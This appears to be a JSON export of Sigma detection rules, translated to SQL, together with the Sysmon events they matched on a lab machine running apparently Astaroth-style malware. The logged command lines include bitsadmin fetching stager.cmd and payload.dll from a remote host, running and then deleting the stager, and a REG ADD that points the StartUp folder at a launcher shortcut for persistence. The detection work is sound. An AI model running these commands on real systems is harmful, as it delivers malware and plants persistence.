[{
  "title": "Bitsadmin Download",
  "id": "d059842b-6b9d-4ed1-b5c3-5b89143c6ede",
  "description": "Detects usage of bitsadmin downloading a file",
  "sigmafile": "astaroth-bits.yml",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel = 'Microsoft-Windows-Sysmon/Operational' AND EventID = '1' AND ((Image LIKE '%\\\\bitsadmin.exe' ESCAPE '\\' AND CommandLine LIKE '% /transfer %' ESCAPE '\\') OR CommandLine LIKE '%copy bitsadmin.exe%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense_evasion",
    "attack.persistence",
    "attack.t1197",
    "attack.s0190"
  ],
  "count": 3,
  "matches": [
    {
      "row_id": 1223,
      "CommandLine": "bitsadmin  /transfer 1 /priority FOREGROUND http://10.211.55.2//stager.cmd C:\\Users\\Public\\Libraries\\raw\\stager.cmd ",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Public\\Libraries\\raw\\",
      "Description": "BITS administration utility",
      "FileVersion": "7.8.19041.1 (WinBuild.160101.0800)",
      "MD5": "01AAB62D5799F75B0D69EB29C1CA6855",
      "SHA256": "739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917",
      "IMPHASH": "774033454EB79213B09F788FC004A02D",
      "Hashes": "MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D",
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "EDD953F8-4788-64A1-DF70-020000000000",
      "LogonId": "0x270df",
      "OriginalFileName": "bitsadmin.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c bitsadmin /transfer 1 /priority FOREGROUND http://10.211.55.2//stager.cmd C:\\Users\\Public\\Libraries\\raw\\stager.cmd & call C:\\Users\\Public\\Libraries\\raw\\stager.cmd & del C:\\Users\\Public\\Libraries\\raw\\stager.cmd",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "EDD953F8-5104-64A1-AD01-000000001C00",
      "ParentProcessId": 3424,
      "ParentUser": "MALWARE-VM\\unina",
      "ProcessGuid": "EDD953F8-5105-64A1-AF01-000000001C00",
      "ProcessId": 3124,
      "Product": "Microsoft® Windows® Operating System",
      "RuleName": "-",
      "TerminalSessionId": 1,
      "User": "MALWARE-VM\\unina",
      "UtcTime": "2023-07-02 10:27:17.024",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "malware-vm",
      "EventID": 1,
      "EventRecordID": 1260,
      "ThreadID": 6628,
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "UserID": "S-1-5-18",
      "Task": 1,
      "SystemTime": "2023-07-02T10:27:17.036387Z",
      "Version": 5,
      "OriginalLogfile": "sysmon_log.evtx-YPZTRXW1.json"
    },
    {
      "row_id": 1225,
      "CommandLine": "bitsadmin  /transfer 1 /priority FOREGROUND http://10.211.55.2//stager.cmd C:\\Users\\Public\\Libraries\\raw\\stager.cmd ",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Public\\Libraries\\raw\\",
      "Description": "BITS administration utility",
      "FileVersion": "7.8.19041.1 (WinBuild.160101.0800)",
      "MD5": "01AAB62D5799F75B0D69EB29C1CA6855",
      "SHA256": "739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917",
      "IMPHASH": "774033454EB79213B09F788FC004A02D",
      "Hashes": "MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D",
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "EDD953F8-4788-64A1-DF70-020000000000",
      "LogonId": "0x270df",
      "OriginalFileName": "bitsadmin.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c bitsadmin /transfer 1 /priority FOREGROUND http://10.211.55.2//stager.cmd C:\\Users\\Public\\Libraries\\raw\\stager.cmd & call C:\\Users\\Public\\Libraries\\raw\\stager.cmd & del C:\\Users\\Public\\Libraries\\raw\\stager.cmd",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "EDD953F8-5163-64A1-B101-000000001C00",
      "ParentProcessId": 396,
      "ParentUser": "MALWARE-VM\\unina",
      "ProcessGuid": "EDD953F8-5163-64A1-B301-000000001C00",
      "ProcessId": 3124,
      "Product": "Microsoft® Windows® Operating System",
      "RuleName": "-",
      "TerminalSessionId": 1,
      "User": "MALWARE-VM\\unina",
      "UtcTime": "2023-07-02 10:28:51.205",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "malware-vm",
      "EventID": 1,
      "EventRecordID": 1262,
      "ThreadID": 6628,
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "UserID": "S-1-5-18",
      "Task": 1,
      "SystemTime": "2023-07-02T10:28:51.210490Z",
      "Version": 5,
      "OriginalLogfile": "sysmon_log.evtx-YPZTRXW1.json"
    },
    {
      "row_id": 1226,
      "CommandLine": "bitsadmin  /transfer 2 /priority FOREGROUND http://10.211.55.2/payload.dll C:\\Users\\Public\\Libraries\\raw\\sqlite3.dll",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Public\\Libraries\\raw\\",
      "Description": "BITS administration utility",
      "FileVersion": "7.8.19041.1 (WinBuild.160101.0800)",
      "MD5": "01AAB62D5799F75B0D69EB29C1CA6855",
      "SHA256": "739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917",
      "IMPHASH": "774033454EB79213B09F788FC004A02D",
      "Hashes": "MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D",
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "EDD953F8-4788-64A1-DF70-020000000000",
      "LogonId": "0x270df",
      "OriginalFileName": "bitsadmin.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c bitsadmin /transfer 1 /priority FOREGROUND http://10.211.55.2//stager.cmd C:\\Users\\Public\\Libraries\\raw\\stager.cmd & call C:\\Users\\Public\\Libraries\\raw\\stager.cmd & del C:\\Users\\Public\\Libraries\\raw\\stager.cmd",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "EDD953F8-5163-64A1-B101-000000001C00",
      "ParentProcessId": 396,
      "ParentUser": "MALWARE-VM\\unina",
      "ProcessGuid": "EDD953F8-5163-64A1-B401-000000001C00",
      "ProcessId": 3124,
      "Product": "Microsoft® Windows® Operating System",
      "RuleName": "-",
      "TerminalSessionId": 1,
      "User": "MALWARE-VM\\unina",
      "UtcTime": "2023-07-02 10:28:51.528",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "malware-vm",
      "EventID": 1,
      "EventRecordID": 1263,
      "ThreadID": 6628,
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "UserID": "S-1-5-18",
      "Task": 1,
      "SystemTime": "2023-07-02T10:28:51.529237Z",
      "Version": 5,
      "OriginalLogfile": "sysmon_log.evtx-YPZTRXW1.json"
    }
  ]
},
{
  "title": "ExtExport.exe DLL Side Loading",
  "id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "description": "Detects ExtExport.exe with arguments being executed. Could indicate a DLL Side-Loading attempt.",
  "sigmafile": "astaroth-extexport.yml",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel = 'Microsoft-Windows-Sysmon/Operational' AND (EventID = '1' AND (Image LIKE '%\\\\extexport.exe' ESCAPE '\\')) AND NOT ((CommandLine LIKE '^[Cc]\\\\:\\\\[Pp]rogram\\\\ [Ff]iles(\\\\ \\\\([Xx]86\\\\))_\\\\[Ii]nternet\\\\ [Ee]xplorer\\\\[Ee]xt[Ee]xport\\\\.exe$' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.execution",
    "attack.defense_evasion",
    "attack.t1059",
    "attack.t1073"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1231,
      "CommandLine": "\"C:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe\" C:\\Users\\Public\\Libraries\\raw foo bar",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Public\\Libraries\\raw\\",
      "Description": "Internet Explorer ImpExp FF exporter",
      "FileVersion": "11.00.19041.1 (WinBuild.160101.0800)",
      "MD5": "3253FD643C51C133C3489A146781913B",
      "SHA256": "D8820E333BE39B27712C42766D1F141CB45FFBE183C43286E55ECC1B9A82FA4B",
      "IMPHASH": "3868F993A68746205F088529EA9E5225",
      "Hashes": "MD5=3253FD643C51C133C3489A146781913B,SHA256=D8820E333BE39B27712C42766D1F141CB45FFBE183C43286E55ECC1B9A82FA4B,IMPHASH=3868F993A68746205F088529EA9E5225",
      "Image": "C:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "EDD953F8-4788-64A1-DF70-020000000000",
      "LogonId": "0x270df",
      "OriginalFileName": "extexport.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c bitsadmin /transfer 1 /priority FOREGROUND http://10.211.55.2//stager.cmd C:\\Users\\Public\\Libraries\\raw\\stager.cmd & call C:\\Users\\Public\\Libraries\\raw\\stager.cmd & del C:\\Users\\Public\\Libraries\\raw\\stager.cmd",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "EDD953F8-5163-64A1-B101-000000001C00",
      "ParentProcessId": 396,
      "ParentUser": "MALWARE-VM\\unina",
      "ProcessGuid": "EDD953F8-5164-64A1-B601-000000001C00",
      "ProcessId": 3124,
      "Product": "Internet Explorer",
      "RuleName": "-",
      "TerminalSessionId": 1,
      "User": "MALWARE-VM\\unina",
      "UtcTime": "2023-07-02 10:28:52.161",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "malware-vm",
      "EventID": 1,
      "EventRecordID": 1268,
      "ThreadID": 6628,
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "UserID": "S-1-5-18",
      "Task": 1,
      "SystemTime": "2023-07-02T10:28:52.170130Z",
      "Version": 5,
      "OriginalLogfile": "sysmon_log.evtx-YPZTRXW1.json"
    }
  ]
},
{
  "title": "Add StartUp Key to Explorer Shell Folders",
  "id": 200067,
  "description": "Add StartUp Key to Explorer Shell Folders",
  "sigmafile": "astaroth-reg.yml",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel = 'Microsoft-Windows-Sysmon/Operational' AND EventID = '1' AND Image LIKE '%\\\\reg.exe' ESCAPE '\\' AND CommandLine LIKE '%\\\\CurrentVersion\\\\Explorer\\\\Shell Folders%StartUp%' ESCAPE '\\' AND CommandLine LIKE '%launcher.lnk%' ESCAPE '\\')"
  ],
  "rule_level": "critical",
  "tags": [],
  "count": 1,
  "matches": [
    {
      "row_id": 1233,
      "CommandLine": "REG  ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\" /f /v StartUp /t REG_SZ /d C:\\Users\\Public\\Libraries\\raw\\launcher.lnk",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Public\\Libraries\\raw\\",
      "Description": "Registry Console Tool",
      "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
      "MD5": "227F63E1D9008B36BDBCC4B397780BE4",
      "SHA256": "C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D",
      "IMPHASH": "BE482BE427FE212CFEF2CDA0E61F19AC",
      "Hashes": "MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "EDD953F8-4788-64A1-DF70-020000000000",
      "LogonId": "0x270df",
      "OriginalFileName": "reg.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c bitsadmin /transfer 1 /priority FOREGROUND http://10.211.55.2//stager.cmd C:\\Users\\Public\\Libraries\\raw\\stager.cmd & call C:\\Users\\Public\\Libraries\\raw\\stager.cmd & del C:\\Users\\Public\\Libraries\\raw\\stager.cmd",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "EDD953F8-5163-64A1-B101-000000001C00",
      "ParentProcessId": 396,
      "ParentUser": "MALWARE-VM\\unina",
      "ProcessGuid": "EDD953F8-5164-64A1-B701-000000001C00",
      "ProcessId": 3124,
      "Product": "Microsoft® Windows® Operating System",
      "RuleName": "-",
      "TerminalSessionId": 1,
      "User": "MALWARE-VM\\unina",
      "UtcTime": "2023-07-02 10:28:52.197",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "malware-vm",
      "EventID": 1,
      "EventRecordID": 1270,
      "ThreadID": 6628,
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "UserID": "S-1-5-18",
      "Task": 1,
      "SystemTime": "2023-07-02T10:28:52.201602Z",
      "Version": 5,
      "OriginalLogfile": "sysmon_log.evtx-YPZTRXW1.json"
    }
  ]
},
{
  "title": "Drops script at startup location",
  "id": 200071,
  "description": "Drops script at startup location",
  "sigmafile": "astaroth-startup.yml",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel = 'Microsoft-Windows-Sysmon/Operational' AND EventID = '11' AND (TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.vbs%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.js%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.jse%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.bat%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.url%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.cmd%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.hta%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.ps1%' ESCAPE '\\' OR TargetFilename LIKE '%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%.lnk%' ESCAPE '\\'))"
  ],
  "rule_level": "critical",
  "tags": [],
  "count": 1,
  "matches": [
    {
      "row_id": 1232,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "ProcessGuid": "EDD953F8-5163-64A1-B101-000000001C00",
      "ProcessId": 3124,
      "RuleName": "T1023",
      "User": "MALWARE-VM\\unina",
      "UtcTime": "2023-07-02 10:28:52.172",
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "malware-vm",
      "EventID": 11,
      "EventRecordID": 1269,
      "ThreadID": 6628,
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "Opcode": 0,
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "UserID": "S-1-5-18",
      "Task": 11,
      "SystemTime": "2023-07-02T10:28:52.187071Z",
      "Version": 2,
      "OriginalLogfile": "sysmon_log.evtx-YPZTRXW1.json",
      "CreationUtcTime": "2023-05-08 16:13:18.020",
      "TargetFileName": "C:\\Users\\unina\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launcher.lnk"
    }
  ]
},
{}]